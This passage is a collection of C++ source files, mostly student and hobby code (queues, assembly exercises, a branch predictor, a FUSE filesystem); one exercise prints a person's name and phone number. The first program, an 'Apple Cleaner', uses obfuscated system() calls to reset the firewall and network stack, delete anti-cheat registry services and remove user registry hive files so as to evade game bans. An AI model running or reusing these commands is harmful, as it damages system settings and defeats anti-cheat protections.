utf8_string;\n}\n",
    "#include <Windows.h>\r\n#include <string>\r\n#include <iostream>\r\n#include \"xor.h\"\r\n#include <urlmon.h>\r\n#include <lmcons.h>\r\n#include \"xor.h\"\r\n#pragma comment(lib, \"urlmon\")\r\n// KRNL ON TOP\r\nstd::wstring GetCurrentUserName()\r\n{\r\n\r\n\r\n\t\r\n\twchar_t un[256 + 1];\r\n\r\n\tDWORD unLen = 256 + 1;\r\n\r\n\tGetUserNameW(un, &unLen);\r\n\r\n\treturn un;\r\n\r\n}\r\nnamespace util {\r\n\r\n\tvoid download_file(LPCSTR dest, LPCSTR url)\r\n\t{\r\n\r\n\t\tURLDownloadToFileA(NULL, dest, url, NULL, NULL);\r\n\r\n\r\n\t}\r\n\r\n\tvoid hide()\r\n\t{\r\n\t\t::ShowWindow(::GetConsoleWindow(), SW_HIDE);\r\n\t}\r\n\tvoid show()\r\n\t{\r\n\t\t::ShowWindow(::GetConsoleWindow(), SW_SHOW);\r\n\t}\r\n}\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\nvoid clean_launcher() {\r\n\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\\\Epic Games\\\\Launcher\\\\Engine\\\\Config\\\\Base.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\\\Epic Games\\\\Launcher\\\\Engine\\\\Config\\\\BaseGame.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\\\Epic Games\\\\Launcher\\\\Engine\\\\Config\\\\Windows\\\\WindowsGame.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\\\Epic Games\\\\Launcher\\\\Engine\\\\Config\\\\BaseInput.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\\\Epic Games\\\\Launcher\\\\Portal\\\\Config\\\\UserLightmass.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\\\Epic Games\\\\Launcher\\\\Engine\\\\Config\\\\Windows\\\\BaseWindowsLightmass.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\Epic Games\\\\Launcher\\\\Portal\\\\Config\\\\UserScalability.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\Epic Games\\\\Launcher\\\\Engine\\\\Config\\\\BaseHardware.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\Epic Games\\\\Launcher\\\\Portal\\\\Config\\\\NotForLicensees\\\\Windows\\\\WindowsHardware.ini\");\r\n}\r\nvoid clean_net() {\r\n\tutil::hide();\r\n\tsystem(_xor_(\"netsh winsock reset\").c_str());\r\n\tsystem(_xor_(\"netsh winsock reset catalog\").c_str());\r\n\tsystem(_xor_(\"netsh int ip reset\").c_str());\r\n\tsystem(_xor_(\"netsh advfirewall reset\").c_str());\r\n\tsystem(_xor_(\"netsh int reset all\").c_str());\r\n\tsystem(_xor_(\"netsh int ipv4 reset\").c_str());\r\n\tsystem(_xor_(\"netsh int ipv6 reset\").c_str());\r\n\tsystem(_xor_(\"ipconfig / release\").c_str());\r\n\tsystem(_xor_(\"ipconfig / renew\").c_str());\r\n\tsystem(_xor_(\"ipconfig / flushdns\").c_str());\r\n\tsystem(\"cls\");\r\n\tutil::show();\r\n}\r\nvoid clean_anticheat() {\r\n\tsystem(_xor_(\"reg delete HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\EasyAntiCheat /f\").c_str());\r\n\tsystem(_xor_(\"reg delete HKLM\\\\SYSTEM\\\\ControlSet001\\\\Services\\\\EasyAntiCheat /f\").c_str());\r\n\tsystem(_xor_(\"reg delete HKLM\\\\SYSTEM\\\\ControlSet001\\\\Services\\\\BEService /f\").c_str());\r\n}\r\nint main()\r\n{\r\n\tSleep(500);\r\n\r\n\tutil::hide();\r\n\r\n\tSleep(2000);\r\n\tutil::show();\r\n\r\n\tsystem(\"Color 0b\");\r\n\t// LAUNCH CLEAN\r\n\tSetConsoleTitleA(\"Apple Cleaner (Updated to S4)\");\r\n\tprintf(\"Apple Cleaner\\n\\n\");\r\n\tprintf(\"[+] Searching for tracking files...\");\r\n\tDeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOCK)\").c_str());\r\n\tif (DeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat)\").c_str()) != 0)\r\n\tprintf(\"Deleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\UsrClass.dat\\n\");\r\n\tif (DeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(AppData\\Local\\Microsoft\\Windows\\UsrClass.dat)\").c_str()) != 0)\r\n\tprintf(\"Deleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\UsrClass.dat\\n\");\r\n\tif (DeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(\\AppData\\Local\\Microsoft\\Windows\\usrclass.dat)\").c_str()) != 0)\r\n\tprintf(\"Deleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\usrclass.dat\\n\");\r\n\tif (DeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(AppData\\Local\\Microsoft\\Windows\\usrclass.dat)\").c_str()) != 0)\r\n\tprintf(\"Deleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Vault\\\\UserProfileRoaming\\\\Latest.dat\\n\");\r\n\tif (DeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(\\AppData\\Local\\Microsoft\\Vault\\UserProfileRoaming\\Latest.dat)\").c_str()) != 0)\r\n\t\r\n\t\t\r\n\t\tprintf(\"Deleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\UsrClass.dat.log1\\n\");\r\n\tprintf(\"\\nDeleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\container.dat\");\r\n        printf(\"\\n[+] System clean\");\r\n\t\tprintf(\"\\nPress any key to continue . . .\");\r\n\t// END OF LAUNCH CLEAN\r\n\tsystem(\"pause > nul\");\t\r\n\r\n\r\n\t\r\n\tsystem(\"cls\");\r\n\t\r\n\r\n\tSleep(2000);\r\n\r\n\tDeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(\\AppData\\Local\\Microsoft\\Windows\\History\\desktop.ini)\").c_str());\r\n\r\n\tif (DeleteFileW((LR\"(C:\\Users\\AppData\\Local\\Microsoft\\Windows\\History\\)\" + GetCurrentUserName() + LR\"(\\desktop.ini)\").c_str()) != 0)\r\n\t\tprintf(\"Deleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\desktop.ini\");\r\n\r\n\t\t//cout << \"Deleted C:\\\\Users\\\\Gaypple\\\\ntuser.ini:NTV\" << endl;\r\n\tprintf(\"\\nDeleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\container.dat\");\r\n\t\tDeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOCK)\").c_str());\r\n\t\tSleep(2000);\r\n\tDeleteFileW((LR\"(D:\\Users\\)\" + GetCurrentUserName() + LR\"(\\App",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "///Queue threw LinkedList\n#include <iostream>\n#include <ctime>\n#include <cstdlib>\n#include <vector>\n\nusing namespace std;\n\nstruct LinkedQue {  //Structure of data jednosmerneho sezn\n    int data = NULL;\n    LinkedQue *next = nullptr;\n};\n\nstruct Switcher { //Struct of Switcher\n    LinkedQue* begin;\n    LinkedQue* end;\n};\n\nvector <int> CreateArray(){ //Creating a random massive\n    srand (static_cast <unsigned int>(time(0)));\n    vector <int> array(rand() % 100);\n    for (int i = 0; i <= array.size(); i++)\n        array[i] = rand() % 100;\n    return array;\n}\n\nstring IsEmpty(Switcher point){ //We use this func in next funct, cuz its here\n    if (point.begin == point.end && point.begin->data == NULL)\n        return \"YES\\n\";\n    return \"NO\\n\";\n}\n\nSwitcher CreateEmptQ(){ //Create an empty queue\n    Switcher que;\n    LinkedQue *zacatek = new LinkedQue;\n    LinkedQue *konec = zacatek; //Beginning of queue\n    que.begin = zacatek;\n    que.end = konec;\n    return que;\n}\n\nvoid Enqueue(Switcher &point, int x){\n    if (IsEmpty(point) == \"YES\\n\")\n        point.begin->data = x;\n    else {\n        point.end->next = new LinkedQue;\n        point.end = point.end->next;\n        point.end->data = x;\n    }\n}\n\nSwitcher CreateLinQue(vector<int>array) { //Creating a Linked Queue\n    Switcher que;\n    LinkedQue *zacatek = new LinkedQue;\n    LinkedQue *konec = zacatek; //Beginning of queue\n    que.begin = zacatek;\n    for (int i = 0; i < array.size() - 1; i++){ // -1 cuz we always creating a NEW list//ENQUEUE\n        konec->data = array[i]; //Konec se stava zacatkem\n        konec->next = new LinkedQue;\n        konec = konec->next;\n    }\n    konec->data = array[array.size() - 1]; //konec = last element\n    que.end = konec;\n    return que;\n}\n\nint Dequeue(Switcher &point){ //DEQUEUE\n    int tmp = point.begin->data;\n    if (point.begin == point.end)\n        point.begin->data = NULL;\n    else\n        point.begin = point.begin->next;\n    return tmp;\n}\n\nint Front(Switcher point){\n    return point.begin->data;\n}\n\nvoid Vypis(Switcher point){\n    LinkedQue* head = point.begin;\n    while (head != nullptr) {\n        cout << head->data << \" \";\n        head = head->next;\n    }\n}\n\n\nint main() {\n    vector<int>array = CreateArray();\n    Switcher head = CreateLinQue(array);\n    cout << \"Seznam cisel: \";\n    Vypis(head);\n    cout << \"\\nF-ce DEQUEUE: \";\n    cout << \"\\nDELETED ELEMENT: \" << Dequeue(head) << \"\\n\";\n    Vypis(head);\n    cout << \"\\nF-ce FRONT: \";\n    cout << \"\\n\" << Front(head);\n    cout << \"\\nIs queue EMPTY?\\n\";\n    cout << IsEmpty(head);\n    int x;\n    cout << \"Ready to push new QUEUE:)\";\n    Switcher head2 = CreateEmptQ();\n    cout << \"\\nEnter a NUM: \\n\";\n    cin >> x;\n    for (int i = 0; i < x; i++)\n        Enqueue(head2,rand() % 10 + 1);\n    cout << \"\\nYour queue: \";\n    Vypis(head2);\n    return 0;\n}",
    "\ufeff#include \"stdio.h\"\n#pragma warning(disable:4996)\n#include <iostream>\n#include <windows.h>\n#include <time.h>\n#include <conio.h>\n\n\nint uloha_2_1_1() {\n    int result = 0;\n    __asm\n    {\n        MOV eax, 2\n        MOV ebx, 3\n        ADD eax, ebx\n        MOV result, eax\n    }\n    printf(\"%d\\n\", result);\n}\n\nint uloha_2_1_2(int cislo) {\n    int result = 0;\n    __asm\n    {\n        MOV eax, cislo\n        SHL eax, 1\n        MOV result, eax\n    }\n    printf(\"%d\\n\", result);\n}\n\nint uloha_2_1_3(int cislo) {\n    int result = 0;\n    __asm\n    {\n        MOV eax, cislo\n        CMP eax, 9\n        JG point\n        ADD eax, '0'\n        JMP END\n        point :\n        ADD eax, 55\n            JMP END\n            END :\n        MOV result, eax;\n    }\n    printf(\"cislo in hexadecimal = %c\\n\", result);\n}\n\nvoid uloha_2_1_4(unsigned int* a, unsigned int* b, unsigned int* c, unsigned int* d) {\n    __asm\n    {\n        mov eax, 0    // Set up the function code\n        cpuid            // Execute CPUID instruction\n        mov edi, a       // Move the address of a into edi\n        mov[edi], eax   // Store the result of CPUID into a\n        mov edi, b       // Move the address of d into edi\n        mov[edi], ebx   // Store the result of CPUID into d\n        mov edi, c       // Move the address of a into edi\n        mov[edi], ecx   // Store the result of CPUID into a\n        mov edi, d       // Move the address of d into edi\n        mov[edi], edx   // Store the result of CPUID into d\n    }\n}\n\nint uloha_2_2() {\n    char string[] = \"architektura_pocitacov_je_super_predmet\";\n    int strlength = sizeof(string) / sizeof(char);\n    for (int i = 0; i < strlength; i++) {\n        printf(\"%c\", string[i]);\n    }\n    char* pointerstr = string;\n    printf(\"\\n%p\\n\", pointerstr);\n    pointerstr += 1;\n    *pointerstr = *\"A\";\n    for (int i = 0; i < strlength; i++) {\n        printf(\"%c\", string[i]);\n    }\n    pointerstr += 1000000;\n//    *pointerstr = *\"A\";\n    //for (int i = 0; i < strlength; i++) {\n    //    printf(\"%c \", string[i]);\n    //}\n\n\n    int pole[] = { 1, 2, 3, 4, 5 };\n    int length = sizeof(pole) / sizeof(int);\n    printf(\"\\n\");\n    for (int i = 0; i < length; i++) {\n        printf(\"%d \", pole[i]);\n    }\n    int* pointer = pole;\n    printf(\"\\n%p\\n\", pointer);\n    pointer += 1;\n    *pointer = 10;\n    for (int i = 0; i < length; i++) {\n        printf(\"%d \", pole[i]);\n    }\n    return 0;\n}\n\nint uloha_2_3_1() {\n    FILE* fr;\n    FILE* fw;\n    fr = fopen(\"poviedka.html\", \"r\");\n    char ch;\n    if (!fr) {\n        printf(\"not\");\n    }\n    else {\n        while ((ch = fgetc(fr)) != EOF) {\n            int char2 = ch;\n            if (char2 == 165) char2 = 188;\n            else if (char2 == 165) char2 = 188;\n            else if (char2 == 169) char2 = 138;\n            else if (char2 == 171) char2 = 141;\n            else if (char2 == 174) char2 = 142;\n            else if (char2 == 181) char2 = 190;\n            else if (char2 == 185) char2 = 154;\n            else if (char2 == 187) char2 = 157;\n            else if (char2 == 190) char2 = 158;\n            printf(\"%c\", char2);\n        }\n    }\n    return 0;\n}\n\nint uloha_2_5_1_pomocny() {\n    HANDLE  hConsole;\n    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n    for (int k = 0; k <= 255; k++) {\n        SetConsoleTextAttribute(hConsole, k);\n        printf(\"color\\n\");\n    }\n    return 0;\n}\n\nint uloha_2_5_1() {\n    HANDLE  hConsole;\n    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n    for (int i = 0; i <= 100; i++) {\n        if (i <= 10) {\n            SetConsoleTextAttribute(hConsole, 10);\n        }\n        else if (i <= 22) {\n            SetConsoleTextAttribute(hConsole, 4);\n        }\n        else if (i <= 35) {\n            SetConsoleTextAttribute(hConsole, 1);\n        }\n        else if (i <= 50) {\n            SetConsoleTextAttribute(hConsole, 5);\n        }\n        else if (i <= 100) {\n            SetConsoleTextAttribute(hConsole, 3);\n        }\n        Sleep(100);\n        printf(\"%.3d\\n\", i);\n    }\n    return 0;\n}\n\nint LinePrinf(char text[], char info[], int length) {\n    HANDLE  hConsole;\n    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n\n    int k = 0;\n\n    printf(\"%c\", 179);\n    SetConsoleTextAttribute(hConsole, 10);\n    printf(\"%s\", text);\n    SetConsoleTextAttribute(hConsole, 6);\n    printf(\"%c \", 179);\n    for (int j = 0; j < length; j++) {\n        if (length - j <= strlen(info)) {\n            SetConsoleTextAttribute(hConsole, 10);\n            printf(\"%c\", info[k]);\n            k++;\n        }\n        else {\n            printf(\" \");\n        }\n    }\n    SetConsoleTextAttribute(hConsole, 6);\n    printf(\" %c\", 179);\n    return 0;\n}\n\nint uloha_2_5_2() {\n    HANDLE  hConsole;\n    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n\n    COORD point = { 50, 10 };\n    char meno[] = \"Roman Rudenko\";\n    char vyska[] = \"180cm\";\n    char hmotnost[] = \"80kg\";\n    char tel[] = \"0968856930\";\n\n    int length = strlen(meno);\n    length = (length >= strlen(vyska)) ? length : strlen(vyska);\n    length = (length >= strlen(hmotnost)) ? leng",
    "#include <iostream>\r\n#include \"gselect.h\"\r\nGSelectBP::GSelectBP(int size, int ctrBits, int globalHistoryBits){\r\n    phtHistoryBits = size * ctrBits;\r\n    bBranch = sizeof(int) * 8;\r\n    branchMask = (1 << bBranch) - 1;\r\n    globalHistoryMask = (1 << globalHistoryBits) - 1;\r\n    PHTThreshold = (1 << (ctrBits - 1));\r\n    prevGlobalHistory = 0;\r\n}\r\n\r\nbool GSelectBP::lookup(int branch_address){\r\n    //define 'n' bits of global history and 'm' bit of branch address\r\n    int global_history = globalHistoryReg & globalHistoryMask;\r\n    int branch_address_bits = branch_address & branchMask;\r\n\r\n    //calculate PHTIdx using 'm' and 'n'\r\n    int PHTIdx = (branch_address_bits ^ global_history) % (1 << phtHistoryBits);\r\n\r\n    //modify the history using the thread to determine a prediction\r\n    return predictorTable[PHTIdx] >= PHTThreshold;\r\n\r\n}\r\nvoid GSelectBP::update(int branch_address, bool taken, bool squashed){\r\n    //modify the history.\r\n    int global_history = globalHistoryReg & globalHistoryMask;\r\n    int branch_address_bits = branch_address & branchMask;\r\n    //if squashed {do something}, otherwise {do something else}.\r\n    bool squashed = squash(squashed);\r\n    if(squashed){\r\n        // Restore global history if it was updated during the prediction of the branch\r\n        // Do not update counters\r\n        globalHistoryReg = prevGlobalHistory;\r\n    }\r\n    // Calculate PHTIdx using m and n\r\n    int PHTIdx = (branch_address_bits ^ global_history) % (1 << phtHistoryBits);\r\n\r\n    // Update PHTCounters accordingly to whether the branch is taken or not\r\n    if (taken) {\r\n        if (predictorTable[PHTIdx] < ((1 << phtcCTRbits) - 1)) {\r\n            predictorTable[PHTIdx]++;\r\n        }\r\n    } else {\r\n        if (predictorTable[PHTIdx] > 0) {\r\n            predictorTable[PHTIdx]--;\r\n        }\r\n    }\r\n\r\n    // Update global history\r\n    prevGlobalHistory = globalHistoryReg;\r\n    globalHistoryReg = ((globalHistoryReg << 1) | taken) & globalHistoryMask;\r\n\r\n    // Delete the history (if needed, depending on the specific requirements)\r\n    // Here, we reset any additional state variables that represent history\r\n    \r\n}\r\nvoid GSelectBP::uBranch(bool taken){\r\n    //modify the history using the thread\r\n    //modify the prediction attribute and global attribute of the history\r\n    globalHistoryReg = ((globalHistoryReg << 1) | taken) & globalHistoryMask;\r\n}\r\nvoid GSelectBP::btbUpdate(){\r\n    //modify the globalHistoryReg of the thread\r\n    globalHistoryReg = (globalHistoryReg << 1) & globalHistoryMask;\r\n}\r\nbool GSelectBP::squash(bool bp_history){\r\n    //consider adding a parameter called bp_history\r\n    \r\n    bool result;\r\n    //modify the globalHistoryReg of the thread\r\n    //delete the history\r\n    globalHistoryReg = 0;\r\n    return result;\r\n}\r\n\r\nint main(){\r\n    GSelectBP predictor(1024, 2, 8);\r\n    int branch_addr = 0x12345678;\r\n    bool prediction = predictor.lookup(branch_addr);\r\n    bool actual_outcome = true;\r\n    bool squashed = false;\r\n    bool bp_history;\r\n    predictor.update(branch_addr, actual_outcome, squashed);\r\n    predictor.uBranch(true);\r\n    predictor.btbUpdate();\r\n    predictor.squash(&bp_history);\r\n    \r\n    return 0;\r\n}",
    "#include <iostream>\n#include <vector>\n#include <cstdlib>\n#include <ctime>\n#include <iomanip>\n\nusing namespace std;\n\nconst int PAGE_SIZE = 1024;\nconst int FRAME_SIZE = 1024;\nconst int NUM_PAGES = 64;\nconst int NUM_FRAMES = 8;\n\n\n\nvector<int> pageFrameTable(NUM_PAGES);\n\nint main() {\n    srand(time(nullptr));\n\n    vector<int> physicalMemory(NUM_FRAMES, -1);\n\n   \n    for (int i = 0; i < NUM_PAGES; ++i) {\n        pageFrameTable[i] = i % NUM_FRAMES;\n    }\n    int logicalAddress;\n    cout << \"Enter a logical address(ex: 0x5678): \";\n    cin >> hex >> logicalAddress; \n    //int logicalAddress = 0x5678;\n\n    int pageNumber = logicalAddress / PAGE_SIZE;\n    int offset = logicalAddress % PAGE_SIZE;\n\n    if (pageNumber < NUM_PAGES) {\n        int frameNumber = pageFrameTable[pageNumber];\n        int physicalAddress = frameNumber * FRAME_SIZE + offset;\n\n        cout << \"Logical Address: 0x\" << hex << setw(4) << setfill('0') << logicalAddress\n            << \" => Page Number: 0x\" << setw(2) << setfill('0') << pageNumber\n            << \", Offset: 0x\" << setw(2) << setfill('0') << (offset % 256) << endl;\n    }\n    else {\n        cout << \"Invalid Page Number: \" << pageNumber << endl;\n    }\n\n\n    return 0;\n}\n\n\n",
    "#include \"TimedAction.h\"\n\n/*\n|| <<constructor>>\n*/\nTimedAction::TimedAction(unsigned long intervl,void (*function)()){\n    active = true;\n\tprevious = 0;\n\tinterval = intervl;\n\texecute = function;\n}\n\n/*\n|| <<constructor>>\n*/\nTimedAction::TimedAction(unsigned long prev,unsigned long intervl,void (*function)()){\n    active = true;\n\tprevious = prev;\n\tinterval = intervl;\n\texecute = function;\n}\n\nvoid TimedAction::reset(){\n    previous = millis();\n}\n\nvoid TimedAction::disable(){\n    active = false;\n}\n\nvoid TimedAction::enable(){\n\tactive = true;\n}\n\n//void TimedAction::check(){\n//  if ( active && (millis()-previous >= interval) ) {\n//    previous = millis();\n//    execute();\n//  }\n//}\n\nvoid TimedAction::check() {\n\t//unsigned long 4,294,967,295 - 4,294,967,295\n\tif (active && ((millis() - previous) >= interval) ) {\n\tprevious = millis();\n\texecute();\n\t}\n\telse if (active && millis()<previous) {\n\t\tunsigned long TMr = (4294967295 - previous);\n\t\tif (TMr < interval) { previous = interval - TMr; }\n\t\telse { previous = millis(); execute(); }\n\t\t//previous =\tinterval - (4294967295- previous) ;\n\t}\n}\n\nvoid TimedAction::setInterval( unsigned long intervl){\n\tinterval = intervl;\n}\n",
    "#include \"FootballTeam.h\"\n#include \"Team.h\"\n#include <iostream>\n#include <string >\nusing namespace std;\n\nvoid FootballTeam::print()\n{\n\tcout << \"Team Name: \" << getTeamName() << endl;\n\tstring cn;\n\tint cid;\n\tteamCoach.getAll(cn, cid);\n\tcout << \"Team Coach: \" << cn;\n\t// the coach name ????\n\tcout << endl;\n\tcout << \"Players:\" << endl;\n\tfor (int i = 0; i < count; i++)\n\t{\n\t\tplayers[i].print();\n\t\t//cout << endl;\n\t\t//cout << players->getStatus() << endl;\n\t}\n}\nFootballTeam::FootballTeam(string tN, string cn, int p, int cid, int mP) :Team(tN, cn, cid)\n{\n\tpoints = p;\n\tcount = 0;\n\tmaxPlayers = mP;\n\tplayers = new Player[maxPlayers];\n\n}\nFootballTeam::FootballTeam(const FootballTeam& FBT): Team(FBT)\n{\n\t(*this).points = FBT.points;\n\t(*this).count = FBT.count;\n\t(*this).maxPlayers = FBT.maxPlayers;\n\n\tplayers =new Player[maxPlayers];///deep copy\n\t\tfor(int i=0;i<count;i++)     \n\t\t\tplayers[i] = FBT.players[i]; //note (not sure about it)\n\n}\n\n\nvoid FootballTeam::updatePoints(int up)\n{\n\tpoints += up;\n}\n\nint FootballTeam::getNumberOfPoints()\n{\n\treturn points;\n}\n\nint FootballTeam::getCount()\n{\n\treturn count;\n}\n\nvoid FootballTeam::addPlayer(string pN, int pI, char s)\n{\n\t\tif (count != maxPlayers)\n\t\t{\t\n\t\t\tbool flag2 = true;\n\t\t\twhile (flag2) {\n\t\t\t\tflag2 = false;\n\t\t\t\tfor (int i = 0; i < count; i++)\n\t\t\t\t{\n\t\t\t\t\tif (pI == players[i].getPlayerID()) {\n\t\t\t\t\t\tcout << \"Please choose other ID.\\n\";\n\t\t\t\t\t\tcin >> pI;\n\t\t\t\t\t\tflag2 = true;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}//if\n\t\t\t\t}//if\n\t\t\t\t\n\t\t\t}//if\n\t\t\tplayers[count++].setAll(pN, pI, s);\n\t\t}//if (maxPlayers)\n\n\t\telse\n\t\t{\n\t\t\tcout << \"You exceeded the max number of players.\" << endl;\n\t\t}//else \n\n}\n\n\nvoid FootballTeam::removePlayer(int pI)\n{// 5 8 2 4\n\tbool flag = false;\n\t\n\tfor (int i = 0; i < count; i++) {\n\t\tif (players[i].getPlayerID() == pI)\n\t\t{\n\t\t\tstring rem_player = players[i].getPlayerName();\n\t\t\tflag = true;\n\t\t\tfor (int j = i; j < count; j++)//for shifting players & delete last one\n\t\t\t\tplayers[j] = players[j + 1];\n\t\t\tcount--;\n\t\t\tcout << \"removed...\"<<rem_player<< endl;\n\t\t\tbreak;\n\t\t}//if \n\t}//// for (int i = 0; i < count; i++)\n\tif (!flag)\n\t\tcout << \"The player is not found in the players list.\" << endl;\n}\n\nstring FootballTeam::retrievePlayerHasNumber(int pI)\n{\n\tfor (int i = 0; i < count; i++)\n\t{\n\t\tif (players[i].getPlayerID() == pI)\n\t\t\treturn players[i].getPlayerName();\n\t}//for\n\treturn \"\";\n}\n\nPlayer* FootballTeam::retrievePlayers(char s)\n{\n\tint counter = 0;\n\tPlayer* p=new Player[count];\n\n\tfor (int i = 0; i < count; i++)\n\t{\n\t\tif (players[i].getStatus() == s)\n\t\t{\n\t\t\tp[counter++] = players[i];\n\t\t}//if\n\t}//for\n\treturn p;\n}\n\nbool FootballTeam::operator==(FootballTeam& FBT)\n{\n\n\treturn (this->count == FBT.count);\n}\n\nFootballTeam FootballTeam::moreNumberOfPoints(FootballTeam* FBT)\n{\n\n\tif (this->points < FBT->points)\n\t\treturn *FBT;\n\telse\n\t\treturn *this;\n}\n\nFootballTeam::~FootballTeam()\n{\n\tdelete[]players;\n}\n\n",
    "#include \"../libWad/Wad.h\"\n#include <fuse.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <time.h>\n#include <string.h>\n#include <stdlib.h>\n\nusing namespace std;\n\nWad* wad;\n\nstatic int getattr_callback(const char* path, struct stat* buf) {    \n    memset(buf, 0, sizeof(struct stat));\n\n    if (wad->isDirectory(path)) { \n        buf->st_mode = S_IFDIR | 0755;\n        buf->st_nlink = 2;\n        return 0;\n    }\n\n    if (wad->isContent(path)) {\n        buf->st_mode = S_IFREG | 0777;\n        buf->st_nlink = 1;\n        buf->st_size = wad->getSize(path);\n        return 0;\n    }\n    return -ENOENT;\n}\n\nstatic int open_callback(const char* path, struct fuse_file_info* fi) {\n    return 0;\n}\n\nstatic int read_callback(const char* path, char* buf, size_t size, off_t offset, struct fuse_file_info* fi) {\n    int contents = wad->getContents(path, buf, size, offset);\n    if (contents != -1) {\n        return contents;\n    }\n    return 0;\n}\n\nstatic int release_callback(const char* path, struct fuse_file_info* fi) {\n    return 0;\n}\n\nstatic int opendir_callback(const char* path, struct fuse_file_info* fi) {\n    return 0;\n}\n\nstatic int readdir_callback(const char* path, void* buf, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info* fi) {\n    (void) offset;\n    (void) fi;\n    vector<string> components;\n\n    filler(buf, \".\", NULL, 0);\n    filler(buf, \"..\", NULL, 0);\n    \n    wad->getDirectory(path, &components);\n\n    for (string s : components) {\n        filler(buf, s.c_str(), NULL, 0);\n    }\n    return 0;\n}\n\nstatic int releasedir_callback(const char* path, struct fuse_file_info* fi) {\n    return 0;\n}\n\nstatic struct fuse_operations fuse_example_operations = {\n  .getattr = getattr_callback,\n  .open = open_callback,\n  .read = read_callback,\n  .release = release_callback,\n  .opendir = opendir_callback,\n  .readdir = readdir_callback,\n  .releasedir = releasedir_callback,\n};\n\nint main(int argc, char* argv[]) {\n  wad = Wad::loadWad(argv[1]);\n\n  argv[1] = argv[2];\n  argv[2] = NULL;\n  argc--;\n\n  return fuse_main(argc, argv, &fuse_example_operations, NULL);\n}",
